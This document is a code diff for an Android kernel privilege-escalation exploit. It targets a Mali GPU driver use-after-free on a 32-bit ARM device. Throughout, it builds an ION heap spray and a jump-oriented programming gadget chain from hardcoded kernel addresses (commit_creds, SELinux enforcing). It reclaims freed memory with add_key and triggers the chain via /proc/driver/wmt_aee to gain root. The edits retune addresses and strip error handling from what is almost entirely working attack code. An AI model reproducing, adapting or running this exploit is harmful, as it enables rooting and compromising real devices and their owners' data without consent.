@@ -26,6 +26,8 @@
 #define SELINUX_ENFORCING_ADDR 0xc10b6238
 #define KMALLOC_CALLER_ADDR 0xc085367c
 
+// exploit stuff
+#define HARDCODED_ION_ADDRESS 0xD09A0400
 #define PATTERN_SIZE 0x100
 
 #define FAKE_MALI_ALLOC_BUFF_SIZE 96
@@ -278,16 +280,13 @@ int ion_spray_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size)
     // c041b730 32 ff 2f e1     blx        r2
     P(&pb, 0x8c, 0xc0427918); // P(&pb, 0x8c, 0xc042790c); // r2, next gadget address
 
-    // c042790c 0d c0 a0 e1     cpy        r12,sp
-    // c0427910 f0 d8 2d e9     stmdb      sp!,{r4,r5,r6,r7,r11,r12,lr,pc}=>LAB_c0427918
-    // c0427914 04 b0 4c e2     sub        r11,r12,#0x4
     // c0427918 1c 30 90 e5     ldr        r3,[r0,#0x1c]
     // c042791c 00 50 a0 e1     cpy        r5,r0
     // c0427920 24 00 90 e5     ldr        r0,[r0,#0x24]
     // c0427924 01 60 a0 e1     cpy        r6,r1
     // c0427928 33 ff 2f e1     blx        r3
     P(&pb, 0x1c, 0xc018c2ec); // r3, next gadget address
-    P(&pb, 0x24, 0xcc921000); // r0, reset to jop chain addr
+    P(&pb, 0x24, HARDCODED_ION_ADDRESS); // r0, reset to jop chain addr
 
     // now do the kmalloc-128, jop chain addr in r0 and r5 rn
 
@@ -303,7 +302,7 @@ int ion_spray_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size)
     //   c01c2738 f6 ff ff 0a     beq        LAB_c01c2718
     //   c01c273c 34 ff 2f e1     blx        r4
     uint32_t r3_offset = 0x2c;
-    P(&pb, 0x8, 0xcc921000 + r3_offset);  // r3
+    P(&pb, 0x8, HARDCODED_ION_ADDRESS + r3_offset);  // r3
     P(&pb, 0x20 + r3_offset, 0xc0416360); // r4, addr of next gadget
 
     // we need r3 to be jop chain, and r1 to be jop chain
@@ -338,8 +337,8 @@ int ion_spray_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size)
     //   c049542c 01 00 00 0a     beq        LAB_c0495438
     //   c0495430 06 10 a0 e1     cpy        r1,r6
     //   c0495434 33 ff 2f e1     blx        r3
-    P(&pb, 0xb4, 0xcc921000);               // r0, addr of jop chain
-    P(&pb, 0x14, 0xcc921000 + 0x28 - 0x1c); // r3, addr of addr of next gadget
+    P(&pb, 0xb4, HARDCODED_ION_ADDRESS);               // r0, addr of jop chain
+    P(&pb, 0x14, HARDCODED_ION_ADDRESS + 0x28 - 0x1c); // r3, addr of addr of next gadget
     P(&pb, 0x28, 0xc07c5238);               // r3, addr of next gagdet
 
     //   c07c5238 2c 30 95 e5     ldr        r3,[r5,#0x2c]
@@ -353,7 +352,7 @@ int ion_spray_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size)
     //   c063d92c b0 30 97 e5     ldr        r3,[r7,#0xb0]
     //   c063d930 36 ff 2f e1     blx        r6
     uint32_t r0_offset = 0x54;
-    P(&pb, 0x98, 0xcc921000 + r0_offset); // r0, might be useful for moving along JOP
+    P(&pb, 0x98, HARDCODED_ION_ADDRESS + r0_offset); // r0, might be useful for moving along JOP
     P(&pb, 0xb0, 0x0);                    // r3, must be zero!
 
     //   c066bd0c 00 30 82 e5     str        r3,[r2,#0x0]
@@ -402,7 +401,7 @@ int ion_spray_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size)
     //   c0416368 04 00 a0 e1     cpy        r0,r4
     //   c041636c 01 70 a0 e1     cpy        r7,r1
     //   c0416370 33 ff 2f e1     blx        r3
-    P(&pb, r0_offset + 0x4c, 0xcc921000 + r0_offset + 0x34 - 0x24); // r3, addr of addr of next gadget
+    P(&pb, r0_offset + 0x4c, HARDCODED_ION_ADDRESS + r0_offset + 0x34 - 0x24); // r3, addr of addr of next gadget
     P(&pb, r0_offset + 0x34, 0xc04c1308);                           // r3, addr of next gadget
 
     //   c04c1308 48 30 90 e5     ldr        r3,[r0,#0x48]
@@ -429,7 +428,7 @@ int ion_spray_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size)
     //   c061c778 13 00 00 0a     beq        LAB_c061c7cc
     //   c061c77c 33 ff 2f e1     blx        r3
     uint32_t r7_offset = 0x68;
-    P(&pb, r0_offset + 0x64, 0xcc921000 + r0_offset + r7_offset); // r7
+    P(&pb, r0_offset + 0x64, HARDCODED_ION_ADDRESS + r0_offset + r7_offset); // r7
     P(&pb, r0_offset + r7_offset + 0x28, 0xc04e7018);             // r3, addr of next gadget
 
     //   c04e7018 18 30 97 e5     ldr        r3,[r7,#0x18]
@@ -440,8 +439,6 @@ int ion_spray_alloc(ion_spray_ctx_t *ctx, uint32_t heap_id, size_t size)
     //   c04e702c 33 ff 2f e1     blx        r3
     P(&pb, r0_offset + r7_offset + 0x18, COMMIT_CREDS_ADDR); // r3, func to execute
     P(&pb, r0_offset + r7_offset + 0xc, 0xc02830dc);         // r3, addr of next gadget, clashes with r4 + 0x14 in earlier gadget, cock
-
-    //   c04279e8 f0 a8 9d e8     ldmia      sp,{r4,r5,r6,r7,r11,sp,pc}
 
     /* Copy pattern repeatedly into destination buffer */
     unsigned char *buf = (unsigned char *)ctx->mapped;
@@ -746,38 +743,15 @@ mmap_result_t mali_mmap_allocation(int mali_fd, uint32_t gpu_vaddr, const char *
     return mapping;
 }
 
-void mali_munmap(mmap_result_t mapping, const char *label)
-{
-    printf("[*] Unmapping %s at %p...\n", label, mapping.addr);
-
-    if (mapping.success && mapping.addr)
-    {
-        if (munmap(mapping.addr, mapping.size) != 0)
-        {
-            printf("[-] Failed to unmap %p: %s\n", mapping.addr, strerror(errno));
-        }
-        else
-        {
-            printf("[+] Successfully unmapped %s\n", label);
-        }
-    }
-}
-
 int trigger_overwritten_function_pointer()
 {
-    uint32_t buffer[1024];
-
-    memset(buffer, 0x41, 0x100);
-
-    buffer[0] = 0xdeadbabe;
-
     int fd = open("/proc/driver/wmt_aee", O_RDONLY);
     if (fd < 0)
     {
         perror("[-] Failed to open /proc/driver/wmt_aee");
         return -1;
     }
-    printf("[+] Successfully opened /proc/driver/wmt_aee (fd=%d)\n", fd);
+    printf("[*] Opened /proc/driver/wmt_aee (fd=%d), and hopefully got root...\n", fd);
 
     if (getuid() == 0)
     {
@@ -817,6 +791,12 @@ int main()
         return -1;
     }
     printf("[+] Leaked /proc/driver/wmt_aee proc_dir_entry pointer: \033[38;5;183m0x%08X\033[0m\n", extracted_proc_struct_addr);
+
+    printf("[*] Sleeping 15 secs to let the kernel relax\n");
+    for (int i = 0; i < 15; i++){
+        sleep(1);
+        printf("[*] %d\n", i);
+    }
 
     // Mali UAF exploit (run 10 times)
     printf("\n");
@@ -928,13 +908,12 @@ int main()
         fake_mali_alloc_buff[0x28 / 4] = 0x00000000;
 
         // list pointers for arbitrary write
-        fake_mali_alloc_buff[0x40 / 4] = 0xcc921000;
+        fake_mali_alloc_buff[0x40 / 4] = HARDCODED_ION_ADDRESS;
         fake_mali_alloc_buff[0x44 / 4] = (extracted_proc_struct_addr + 0x24);
 
         // STEP 7: Unmap vma2 to trigger FREE
         printf("\n[7] Unmapping vma2 (triggers FREE, refcount 1 -> 0)\n");
-
-        mali_munmap(mapping_vma2, "vma2");
+        munmap(mapping_vma2.addr, mapping_vma2.size);
 
         // STEP 8: Spray to reclaim freed object with fake mali_alloc
         printf("\n[8] Spraying with add_key to reclaim freed object\n");
@@ -942,24 +921,12 @@ int main()
         key_serial_t spray_key = add_key("user", "spray_reclaim", fake_mali_alloc_buff,
                                          sizeof(fake_mali_alloc_buff), KEY_SPEC_PROCESS_KEYRING);
 
-        if (spray_key < 0)
-        {
-            printf("[-] add_key failed: %s\n", strerror(errno));
-        }
-        else
-        {
-            printf("[+] Spray successful (key_id=%d)\n", spray_key);
-        }
-
-        usleep(1000);
-
         // STEP 9: Trigger UAF
-        printf("\n[9] Unmapping orphaned vma1 (TRIGGERS UAF -> arbitrary write)\n");
+        printf("\n[9 + 10] Unmapping orphaned vma1 (TRIGGERS UAF -> arbitrary write), then trigger JOP-chain\n");
 
-        mali_munmap(mapping_vma1, "vma1 (UAF)");
+        munmap(mapping_vma1.addr, mapping_vma1.size);
 
         // STEP 10: Trigger JOP chain
-        printf("\n[10] Triggering JOP chain via %s...\n", WMT_AEE_PATH);
         trigger_overwritten_function_pointer();
 
         // Cleanup for this attempt
